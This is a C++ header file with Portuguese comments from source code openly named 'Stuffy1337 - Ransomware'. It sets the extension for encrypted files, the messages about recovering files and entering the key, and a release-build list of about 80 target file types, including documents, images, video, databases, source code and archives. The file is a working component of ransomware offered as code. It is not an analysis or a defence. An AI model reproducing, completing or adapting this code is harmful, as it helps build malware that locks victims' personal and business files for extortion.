#pragma once // Incluir apenas uma vez

#ifndef CONFIG // Verifica se a CONFIG n�o est� definida
#define CONFIG // Define a CONFIG

// Inclus�es de livrarias
#include <set>
#include <iostream>
#include <string>

using namespace std;

#define APPLICATION_NAME L"Stuffy1337 - Ransomware" // constante com o nome da aplica��o
#define DEFAULT_ENCRYPT_EXTENSION "stf" // Constante com a exten��o a ser definida
#define SUCCESS_MESSAGE L"Os seus ficheiros foram recuperados."
#define UNSUCCESSFUL_MESSAGE L"Porfavor introduza a chave correta!"

#if _DEBUG
#define SEARCH_PATH "test"
#else 
#define SEARCH_PATH ""
#endif

// Declara o namespace que nos permite uma desambigua��o das exten��es
namespace config {
	// S�o declarados os "contentores" que armazenam elementos exclusivos seguidos de uma ordem espec�fica
	static std::set < std::string > ENCRYPT_EXTENSIONS; // "Contentor" que vai armazenar as exten��es a serem encriptadas
	static std::set < std::string > DECRPYTION_EXTENSIONS; // "Contentor" que vai armazenar as exten��es a serem desencriptadas

	static void init() {
		ENCRYPT_EXTENSIONS.clear(); // Limpa o cote�do do "contentor"
		DECRPYTION_EXTENSIONS.clear(); // Limpa o cote�do do "contentor"

		// Adiciona as exten��es ao "Contentor" a serem encriptadas
		#if _DEBUG
			ENCRYPT_EXTENSIONS.insert("wasd");
			ENCRYPT_EXTENSIONS.insert("jpg");
			ENCRYPT_EXTENSIONS.insert("png");
		#else
			ENCRYPT_EXTENSIONS.insert("jpeg");
			ENCRYPT_EXTENSIONS.insert("jpg");
			ENCRYPT_EXTENSIONS.insert("png");
			ENCRYPT_EXTENSIONS.insert("gif");
			ENCRYPT_EXTENSIONS.insert("bmp");
			ENCRYPT_EXTENSIONS.insert("mp4");
			ENCRYPT_EXTENSIONS.insert("avi");
			ENCRYPT_EXTENSIONS.insert("mov");
			ENCRYPT_EXTENSIONS.insert("wmv");
			ENCRYPT_EXTENSIONS.insert("doc");
			ENCRYPT_EXTENSIONS.insert("dot");
			ENCRYPT_EXTENSIONS.insert("wbk");
			ENCRYPT_EXTENSIONS.insert("docx");
			ENCRYPT_EXTENSIONS.insert("docm");
			ENCRYPT_EXTENSIONS.insert("dotx");
			ENCRYPT_EXTENSIONS.insert("dotm");
			ENCRYPT_EXTENSIONS.insert("docb");
			ENCRYPT_EXTENSIONS.insert("xls");
			ENCRYPT_EXTENSIONS.insert("xlt");
			ENCRYPT_EXTENSIONS.insert("xlm");
			ENCRYPT_EXTENSIONS.insert("xlsx");
			ENCRYPT_EXTENSIONS.insert("xlsm");
			ENCRYPT_EXTENSIONS.insert("xltx");
			ENCRYPT_EXTENSIONS.insert("xltm");
			ENCRYPT_EXTENSIONS.insert("xlsb");
			ENCRYPT_EXTENSIONS.insert("xla");
			ENCRYPT_EXTENSIONS.insert("xlam");
			ENCRYPT_EXTENSIONS.insert("xll");
			ENCRYPT_EXTENSIONS.insert("xlw");
			ENCRYPT_EXTENSIONS.insert("ppt");
			ENCRYPT_EXTENSIONS.insert("pot");
			ENCRYPT_EXTENSIONS.insert("pps");
			ENCRYPT_EXTENSIONS.insert("pptx");
			ENCRYPT_EXTENSIONS.insert("pptm");
			ENCRYPT_EXTENSIONS.insert("potx");
			ENCRYPT_EXTENSIONS.insert("potm");
			ENCRYPT_EXTENSIONS.insert("ppam");
			ENCRYPT_EXTENSIONS.insert("ppsx");
			ENCRYPT_EXTENSIONS.insert("ppsm");
			ENCRYPT_EXTENSIONS.insert("sldx");
			ENCRYPT_EXTENSIONS.insert("sldm");
			ENCRYPT_EXTENSIONS.insert("accdb");
			ENCRYPT_EXTENSIONS.insert("accde");
			ENCRYPT_EXTENSIONS.insert("accdt");
			ENCRYPT_EXTENSIONS.insert("accdr");
			ENCRYPT_EXTENSIONS.insert("pub");
			ENCRYPT_EXTENSIONS.insert("xps");
			ENCRYPT_EXTENSIONS.insert("xml");
			ENCRYPT_EXTENSIONS.insert("vdx");
			ENCRYPT_EXTENSIONS.insert("vsx");
			ENCRYPT_EXTENSIONS.insert("vtx");
			ENCRYPT_EXTENSIONS.insert("xsn");
			ENCRYPT_EXTENSIONS.insert("jar");
			ENCRYPT_EXTENSIONS.insert("html");
			ENCRYPT_EXTENSIONS.insert("mp3");
			ENCRYPT_EXTENSIONS.insert("mpeg");
			ENCRYPT_EXTENSIONS.insert("pdf");
			ENCRYPT_EXTENSIONS.insert("rar");
			ENCRYPT_EXTENSIONS.insert("zip");
			ENCRYPT_EXTENSIONS.insert("php");
			ENCRYPT_EXTENSIONS.insert("c");
			ENCRYPT_EXTENSIONS.insert("cpp");
			ENCRYPT_EXTENSIONS.insert("cs");
			ENCRYPT_EXTENSIONS.insert("js");
			ENCRYPT_EXTENSIONS.insert("txt");
			ENCRYPT_EXTENSIONS.insert("wav");
			ENCRYPT_EXTENSIONS.insert("psd");
			ENCRYPT_EXTENSIONS.insert("cdr");
			ENCRYPT_EXTENSIONS.insert("ai");
			ENCRYPT_EXTENSIONS.insert("css");
			ENCRYPT_EXTENSIONS.insert("asp");
			ENCRYPT_EXTENSIONS.insert("aspx");
			ENCRYPT_EXTENSIONS.insert("jsp");
			ENCRYPT_EXTENSIONS.insert("cfm");
			ENCRYPT_EXTENSIONS.insert("svg");
			ENCRYPT_EXTENSIONS.insert("tif");
			ENCRYPT_EXTENSIONS.insert("sql");
			ENCRYPT_EXTENSIONS.insert("7z");
			ENCRYPT_EXTENSIONS.insert("tar");
			ENCRYPT_EXTENSIONS.insert("gz");
		#endif
		DECRPYTION_EXTENSIONS.insert(DEFAULT_ENCRYPT_EXTENSION); // Adiciona as exten��es de desencripta��o iguais as exten��es de encripta��o
	}
}

#endif